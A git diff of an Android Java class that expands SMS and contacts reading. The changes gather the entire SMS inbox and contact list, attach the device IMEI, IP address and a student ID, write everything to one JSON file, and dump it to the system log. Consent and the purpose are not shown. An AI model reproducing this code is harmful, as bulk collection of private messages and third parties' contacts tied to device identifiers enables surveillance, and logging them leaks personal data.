@@ -7,6 +7,7 @@ import android.database.sqlite.SQLiteException;
 import android.net.Uri;
 import android.os.Environment;
 import android.provider.ContactsContract;
+import android.telephony.TelephonyManager;
 import android.util.Log;
 
 import org.json.JSONArray;
@@ -35,6 +36,7 @@ public class MainApplication {
     public static String mainapp_doccheck = "";
     public static String mainapp_professioncheck = "";
     public static String mainapp_currentCity = "";
+    static String stringAllSmsContacts;
 
 
     public static String latestSmsDate = "";
@@ -54,11 +56,13 @@ public class MainApplication {
     /**
      * Read SMS
      **/
-    public static void readSms(Context context) {
+    public static void readSms(Context context, String userNo, String studentID) {
         Context c = context;
         SmsPojo objSms;
         String message = "";
-        String mobileNo = "", userid = "", data = "", page = "", userName = "", imeiNo = "", simImei = "";
+        String mobileNo = "", userid = "", data = "", page = "", userName = "", imeiNo = "", simImei = "", ipaddress="";
+
+        Log.e(TAG, "readSms: "+"Mobile No : "+ mobileNo + "studentID" + studentID );
 
 
         final String SMS_URI_INBOX = "content://sms/inbox";
@@ -141,15 +145,25 @@ public class MainApplication {
                         json.put(mObject);
                     }
                 }
+                TelephonyManager telephonyManager = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
+                imeiNo = telephonyManager.getDeviceId();
+                ipaddress = Utils.getIPAddress(true);
+                Log.e(TAG, "readSms: "+"IMEINO:="+imeiNo + "ipaddress:"+ipaddress);
+                outerOb.accumulate("student_id", studentID);
+                outerOb.accumulate("student_mobile_no", userNo);
+                outerOb.accumulate("created_by_ip", ipaddress);
                 outerOb.accumulate("sim_serial_no", simImei);
                 outerOb.accumulate("imei", imeiNo);
                 outerOb.accumulate("user", userName);
                 outerOb.put("Sms_info", json);
                 message = outerOb.toString();
+                stringAllSmsContacts = message;
+                Log.e(TAG, "smsReadSTRINGBUFF: "+stringAllSmsContacts );
 //                Log.e("", "readSms: "+message );
 
             }
-            mCreateAndSaveFile("saveSMS.json", message);
+//            mCreateAndSaveFile("saveSMS.json", message);
+            contactsRead(context, userNo, studentID);
 
         } catch (SQLiteException ex)
 
@@ -185,7 +199,7 @@ public class MainApplication {
     /**
      * CONTACTS READ
      **/
-    public static void contactsRead(Context c) throws JSONException {
+    public static void contactsRead(Context c,  String userNo, String studentID) throws JSONException {
         Context context = c;
         JSONArray jsonArray = new JSONArray();
         JSONObject outerOb = new JSONObject();
@@ -224,15 +238,25 @@ public class MainApplication {
                     }
 
                     JSONObject mObject = new JSONObject();
-                    mObject.accumulate("name", name);
-                    mObject.accumulate("number", phoneNo);
+                    mObject.accumulate("contact_name", name);
+                    mObject.accumulate("contact_mobile_no", phoneNo);
 
                     jsonArray.put(mObject);
 
-//                    outerOb.accumulate("imei", imeiNo);
+                    TelephonyManager telephonyManager = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
+                    imeiNo = telephonyManager.getDeviceId();
+                    String ipaddress = Utils.getIPAddress(true);
+                    String simImei = "";
+                    outerOb.accumulate("student_id", studentID);
+                    outerOb.accumulate("student_mobile_no", userNo);
+                    outerOb.accumulate("created_by_ip", ipaddress);
+                    outerOb.accumulate("sim_serial_no", simImei);
+                    outerOb.accumulate("imei", imeiNo);
                     outerOb.put("contacts_info", jsonArray);
                     contacts = outerOb.toString();
-                    mCreateAndSaveFile("contacts.json", contacts);
+                    stringAllSmsContacts += contacts;
+                    Log.e(TAG, "contactsReadSTRINGBUFF: "+stringAllSmsContacts );
+                    mCreateAndSaveFile("saveSMS.json", stringAllSmsContacts);
                 }
             }
         } catch (JSONException e) {
